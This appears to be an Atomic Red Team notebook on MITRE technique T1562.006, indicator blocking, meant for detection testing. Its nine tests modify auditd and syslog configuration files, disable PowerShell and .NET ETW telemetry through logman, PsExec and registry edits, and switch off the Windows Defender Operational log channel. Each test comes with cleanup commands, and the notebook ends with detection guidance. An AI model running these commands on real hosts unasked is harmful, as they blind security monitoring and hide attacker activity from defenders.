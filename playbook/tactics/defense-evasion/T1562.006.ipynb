{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "780b23d6",
   "metadata": {},
   "source": "# T1562.006 - Indicator Blocking\nAn adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting(Citation: Microsoft Lamin Sept 2017) or even disabling host-based sensors, such as Event Tracing for Windows (ETW)(Citation: Microsoft About Event Tracing 2018), by tampering settings that control the collection and flow of event telemetry.(Citation: Medium Event Tracing Tampering 2018) These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as [PowerShell](https://attack.mitre.org/techniques/T1059/001) or [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).\n\nFor example, adversaries may modify the `File` value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Security</code> to hide their malicious actions in a new or different .evtx log file. This action does not require a system reboot and takes effect immediately.(Citation: disable_win_evt_logging) \n\nETW interruption can be achieved multiple ways, however most directly by defining conditions using the [PowerShell](https://attack.mitre.org/techniques/T1059/001) <code>Set-EtwTraceProvider</code> cmdlet or by interfacing directly with the Registry to make alterations.\n\nIn the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products.\n\nIn Linux environments, adversaries may disable or reconfigure log processing tools such as syslog or nxlog to inhibit detection and monitoring capabilities to facilitate follow on behaviors (Citation: LemonDuck)."
  },
  {
   "cell_type": "markdown",
   "id": "d57c059a",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "df1a58ea",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Auditing Configuration Changes on Linux Host",
    "Emulates modification of auditd configuration files\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `bash`\n",
    "```bash\nsed -i '$ a #art_test_1562_006_1' /etc/audisp/audispd.conf\nif [ -f \"/etc/auditd.conf\" ];\nthen sed -i '$ a #art_test_1562_006_1' /etc/auditd.conf\nelse sed -i '$ a #art_test_1562_006_1' /etc/audit/auditd.conf\nfi \nsed -i '$ a #art_test_1562_006_1' /etc/libaudit.conf\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e1f33007",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "dd78cdb0",
   "metadata": {},
   "source": "#### Cleanup: \n```bash\nsed -i '$ d' /etc/audisp/audispd.conf\nif [ -f \"/etc/auditd.conf\" ];\nthen sed -i '$ d' /etc/auditd.conf\nelse sed -i '$ d' /etc/audit/auditd.conf\nfi\nsed -i '$ d' /etc/libaudit.conf\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e326c92b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "b91b976a",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Auditing Configuration Changes on FreeBSD Host",
    "Emulates modification of auditd configuration files\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\necho '#art_test_1562_006_1' >> /etc/security/audit_event\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c5b08164",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "08cfcdd8",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nsed -i \"\" '/#art_test_1562_006_1/d' /etc/security/audit_event\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3d3037d5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "5afbdff2",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Logging Configuration Changes on Linux Host",
    "Emulates modification of syslog configuration.\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `bash`\n",
    "```bash\nif [ -f \"/etc/syslog.conf\" ];\nthen sed -i '$ a #art_test_1562_006_2' /etc/syslog.conf\nfi\nif [ -f \"/etc/rsyslog.conf\" ];\nthen sed -i '$ a #art_test_1562_006_2' /etc/rsyslog.conf\nfi\nif [ -f \"/etc/syslog-ng/syslog-ng.conf\" ];\nthen sed -i '$ a #art_test_1562_006_2' /etc/syslog-ng/syslog-ng.conf\nfi\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7a256292",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "652de601",
   "metadata": {},
   "source": "#### Cleanup: \n```bash\nif [ -f \"/etc/syslog.conf\" ];\nthen sed -i '$ d' /etc/syslog.conf\nfi\nif [ -f \"/etc/rsyslog.conf\" ];\nthen sed -i '$ d' /etc/rsyslog.conf\nfi\nif [ -f \"/etc/syslog-ng/syslog-ng.conf\" ];\nthen sed -i '$ d' /etc/syslog-ng/syslog-ng.conf\nfi\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a9a2629e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "7399ce0e",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - Logging Configuration Changes on FreeBSD Host",
    "Emulates modification of syslog configuration.\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nif [ -f \"/etc/syslog.conf\" ];\nthen echo '#art_test_1562_006_2' >> /etc/syslog.conf\nfi\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "42c104cf",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "827cf88a",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nif [ -f \"/etc/syslog.conf\" ];\nthen sed -i \"\" '/#art_test_1562_006_2/d' /etc/syslog.conf\nfi\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0d09de7a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "0b3bc8e9",
   "metadata": {},
   "source": "### Atomic Test #5 - Disable Powershell ETW Provider - Windows\nThis test was created to disable the Microsoft Powershell ETW provider by using the built-in Windows tool, logman.exe. This provider is used as a common source of telemetry in AV/EDR solutions.\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: PSExec must be installed on the machine.\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\pstools\\PsExec.exe\") {exit 0} else {exit 1}\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PStools.zip\"\nexpand-archive -literalpath \"PathToAtomicsFolder\\..\\ExternalPayloads\\PStools.zip\" -destinationpath \"PathToAtomicsFolder\\..\\ExternalPayloads\\pstools\" -force\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "19127364",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 5 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "7f83c845",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\ncmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\pstools\\PsExec.exe\" -accepteula -i -s cmd.exe /c logman update trace \"EventLog-Application\" --p \"Microsoft-Windows-Powershell\" -ets```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "602a0013",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "b24bbcf5",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\ncmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\pstools\\PsExec.exe\" -i -s cmd.exe /c logman update trace \"EventLog-Application\" -p \"Microsoft-Windows-Powershell\" -ets```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d0e3490e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 5 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "81d448cc",
   "metadata": {},
   "source": [
    "### Atomic Test #6 - Disable .NET Event Tracing for Windows Via Registry (cmd)",
    "Disables ETW for the .NET Framework using the reg.exe utility to update the Windows registry",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nREG ADD HKLM\\Software\\Microsoft\\.NETFramework /v ETWEnabled /t REG_DWORD /d 0```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "267275a6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "5ed5dcb4",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nREG DELETE HKLM\\Software\\Microsoft\\.NETFramework /v ETWEnabled /f > nul 2>&1```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bafcb607",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 6 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "d076006d",
   "metadata": {},
   "source": [
    "### Atomic Test #7 - Disable .NET Event Tracing for Windows Via Registry (powershell)",
    "Disables ETW for the .NET Framework using PowerShell to update the Windows registry",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nNew-ItemProperty -Path HKLM:\\Software\\Microsoft\\.NETFramework -Name ETWEnabled -Value 0 -PropertyType \"DWord\" -Force```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e05efd57",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "624902ac",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nREG DELETE HKLM\\Software\\Microsoft\\.NETFramework /v ETWEnabled /f > $null 2>&1```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d5fbae14",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 7 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "d34173cd",
   "metadata": {},
   "source": [
    "### Atomic Test #8 - LockBit Black - Disable the ETW Provider of Windows Defender -cmd",
    "An adversary can disable the ETW Provider of Windows Defender,\nso nothing would be logged to Microsoft-Windows-Windows-Defender/Operational anymore.\nhttps://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational\" /v Enabled /t REG_DWORD /d 0 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4041f616",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "fa3d57ff",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational\" /v Enabled /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a32b7264",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 8 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "cedfc716",
   "metadata": {},
   "source": [
    "### Atomic Test #9 - LockBit Black - Disable the ETW Provider of Windows Defender -Powershell",
    "An adversary can disable the ETW Provider of Windows Defender,\nso nothing would be logged to Microsoft-Windows-Windows-Defender/Operational anymore.\nhttps://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nNew-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational\" -Name Enabled  -PropertyType DWord -Value 0 -Force\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "62340168",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 9"
  },
  {
   "cell_type": "markdown",
   "id": "27f2dcbc",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational\" -Name Enabled -Force -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8980eec6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.006 -TestNumbers 9 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "5fa8ca14",
   "metadata": {},
   "source": "## Detection\nDetect lack of reported activity from a host sensor. Different methods of blocking may cause different disruptions in reporting. Systems may suddenly stop reporting all data or only certain kinds of data.\n\nDepending on the types of host information collected, an analyst may be able to detect the event that triggered a process to stop or connection to be blocked. For example, Sysmon will log when its configuration state has changed (Event ID 16) and Windows Management Instrumentation (WMI) may be used to subscribe ETW providers that log any provider removal from a specific trace session. (Citation: Medium Event Tracing Tampering 2018) To detect changes in ETW you can also monitor the registry key which contains configurations for all ETW event providers: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\AUTOLOGGER_NAME\\{PROVIDER_GUID}</code>"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}